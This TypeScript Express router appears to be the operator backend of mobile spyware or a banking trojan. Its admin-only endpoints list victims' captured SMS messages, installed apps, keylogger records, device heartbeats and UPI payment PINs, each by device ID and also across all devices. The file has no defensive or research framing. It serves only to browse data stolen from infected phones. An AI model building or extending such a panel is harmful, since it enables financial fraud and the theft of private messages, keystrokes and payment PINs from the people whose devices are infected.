import { Router, Request, Response } from 'express';
import { createClient } from '@supabase/supabase-js';
import config from '../../config/env';
import { authenticate, requireRole } from '../../middleware/auth';
import { asyncHandler } from '../../middleware/errorHandler';

const router = Router();
const supabase = createClient(config.supabase.url, config.supabase.serviceRoleKey);

const adminOnly = [authenticate, requireRole(['admin'])];

/**
 * GET /api/v1/devices/data/:deviceId/messages
 */
router.get('/:deviceId/messages', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 100 } = req.query;

    const { data, error } = await supabase
        .from('sms_messages')
        .select('*')
        .eq('device_id', deviceId)
        .order('timestamp', { ascending: false })
        .limit(Number(limit));

    if (error) throw error;
    return res.json({ success: true, messages: data });
}));

/**
 * GET /api/v1/devices/data/:deviceId/apps
 */
router.get('/:deviceId/apps', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 200 } = req.query;

    const { data, error } = await supabase
        .from('installed_apps')
        .select('*')
        .eq('device_id', deviceId)
        .order('app_name', { ascending: true })
        .limit(Number(limit));

    if (error) throw error;
    return res.json({ success: true, apps: data });
}));

/**
 * GET /api/v1/devices/data/:deviceId/keylogs
 */
router.get('/:deviceId/keylogs', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 100 } = req.query;

    const { data, error } = await supabase
        .from('key_logger')
        .select('*')
        .eq('device_id', deviceId)
        .order('created_at', { ascending: false })
        .limit(Number(limit));

    if (error) throw error;
    return res.json({ success: true, keylogs: data });
}));

/**
 * GET /api/v1/devices/data/:deviceId/upi-pins
 */
router.get('/:deviceId/upi-pins', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;

    const { data, error } = await supabase
        .from('upi_pins')
        .select('*')
        .eq('device_id', deviceId)
        .order('created_at', { ascending: false });

    if (error) throw error;
    return res.json({ success: true, pins: data });
}));

/**
 * GET /api/v1/devices/data/:deviceId/heartbeat
 */
router.get('/:deviceId/heartbeat', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 50 } = req.query;

    const { data, error } = await supabase
        .from('heartbeat')
        .select('*')
        .eq('device_id', deviceId)
        .order('last_update', { ascending: false })
        .limit(Number(limit));

    if (error) throw error;
    return res.json({ success: true, heartbeat: data });
}));

/**
 * GET /api/v1/devices/data/messages (Global)
 */
router.get('/messages', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { limit = 100 } = req.query;
    const { data, error } = await supabase
        .from('sms_messages')
        .select('*')
        .order('timestamp', { ascending: false })
        .limit(Number(limit));

    if (error) throw error;
    return res.json({ success: true, messages: data });
}));

/**
 * GET /api/v1/devices/data/apps (Global)
 */
router.get('/apps', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { limit = 200 } = req.query;
    const { data, error } = await supabase
        .from('installed_apps')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(Number(limit));

    if (error) throw error;
    return res.json({ success: true, apps: data });
}));

/**
 * GET /api/v1/devices/data/keylogs (Global)
 */
router.get('/keylogs', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { limit = 100 } = req.query;
    const { data, error } = await supabase
        .from('key_logger')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(Number(limit));

    if (error) throw error;
    return res.json({ success: true, keylogs: data });
}));

/**
 * GET /api/v1/devices/data/upi-pins (Global)
 */
router.get('/upi-pins', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { limit = 100 } = req.query;
    const { data, error } = await supabase
        .from('upi_pins')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(Number(limit));

    if (error) throw error;
    return res.json({ success: true, pins: data });
}));

export default router;
